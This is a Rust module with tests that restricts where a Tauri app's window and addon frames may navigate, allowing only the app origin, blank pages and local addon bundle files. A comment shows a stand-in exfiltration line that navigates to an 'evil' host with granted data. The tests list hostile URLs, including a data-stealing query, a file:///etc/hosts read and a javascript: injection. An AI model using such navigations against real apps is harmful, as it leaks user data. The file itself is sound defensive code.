//! Where the main window — and every frame inside it — may navigate.
//!
//! The app's page never navigates: it routes by hash, opens links through
//! the opener and hands files to the shell. An addon's frame (18 — Addons)
//! is the one document in the window whose script is not ours, and a
//! sandbox cannot stop a document from navigating *itself* — `location =
//! "https://evil/?" + what_it_was_told` would leave the machine with what
//! the person granted. WebKit asks the navigation delegate about every
//! frame's navigation, and wry hands the URL to `on_navigation`; this module
//! is the answer: the app's own origin, the empty page, and an addon's
//! bundle on the node — nothing else, in no frame.

use tauri::Url;

/// The dev server the webview loads in development (`tauri.conf.json`
/// `build.devUrl`); never allowed in a release build.
const DEV_SERVER: &str = "http://localhost:1420";

/// Whether the window may navigate to `url`. `node_base` is where the node
/// answers (`http://127.0.0.1:<port>`) or `None` before it is up.
pub fn allowed(url: &Url, node_base: Option<&str>) -> bool {
    match url.scheme() {
        // The app itself: `tauri://localhost` on macOS, `http(s)://tauri.localhost` elsewhere.
        "tauri" => true,
        "about" => true,
        "http" | "https" if url.host_str() == Some("tauri.localhost") => true,
        "http" if cfg!(debug_assertions) && url.as_str().starts_with(DEV_SERVER) => {
            // Vite's dev server, in a debug build only.
            true
        }
        "http" => is_addon_file(url, node_base),
        _ => false,
    }
}

/// `<node_base>/addons/<id>/files/<path>` — a bundle file of an installed
/// addon, on this node and nowhere else. The id is one path segment; the
/// path is not empty; nothing after the base but that.
fn is_addon_file(url: &Url, node_base: Option<&str>) -> bool {
    let Some(base) = node_base else {
        return false;
    };
    let Ok(base) = Url::parse(base) else {
        return false;
    };
    if url.scheme() != base.scheme()
        || url.host_str() != base.host_str()
        || url.port_or_known_default() != base.port_or_known_default()
    {
        return false;
    }
    let Some(rest) = url.path().strip_prefix("/addons/") else {
        return false;
    };
    matches!(
        rest.split_once("/files/"),
        Some((id, file)) if !id.is_empty() && !id.contains('/') && !file.is_empty()
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn url(s: &str) -> Url {
        Url::parse(s).unwrap()
    }

    #[test]
    fn the_app_the_empty_page_and_a_bundle_file_are_allowed() {
        let node = Some("http://127.0.0.1:4477");
        for ok in [
            "tauri://localhost/",
            "tauri://localhost/index.html#/inbox",
            "http://tauri.localhost/",
            "https://tauri.localhost/x",
            "about:blank",
            "about:srcdoc",
            "http://127.0.0.1:4477/addons/clock/files/index.html",
            "http://127.0.0.1:4477/addons/acme.byte/files/img/a.png",
            "http://127.0.0.1:4477/addons/clock/files/bisa-addon.js",
        ] {
            assert!(allowed(&url(ok), node), "{ok}");
        }
    }

    #[test]
    fn everything_else_is_refused_in_every_frame() {
        let node = Some("http://127.0.0.1:4477");
        for bad in [
            "https://evil.example/?stolen=1",
            "http://127.0.0.1:4477/addons",
            "http://127.0.0.1:4477/addons/clock",
            "http://127.0.0.1:4477/addons/clock/files/",
            "http://127.0.0.1:4477/health",
            "http://127.0.0.1:4477/pets/x/sprite",
            "http://127.0.0.1:9999/addons/clock/files/index.html",
            "http://localhost:4477/addons/clock/files/index.html",
            "https://127.0.0.1:4477/addons/clock/files/index.html",
            "file:///etc/hosts",
            "data:text/html,hi",
            "blob:tauri://localhost/x",
            "javascript:alert(1)",
        ] {
            assert!(!allowed(&url(bad), node), "{bad}");
        }
        assert!(
            !allowed(
                &url("http://127.0.0.1:4477/addons/clock/files/index.html"),
                None
            ),
            "no node, no bundle"
        );
    }

    #[test]
    fn the_dev_server_is_a_debug_build_s_alone() {
        let dev = url("http://localhost:1420/index.html");
        assert_eq!(allowed(&dev, None), cfg!(debug_assertions));
        assert!(!allowed(&url("http://localhost:1421/"), None));
    }
}
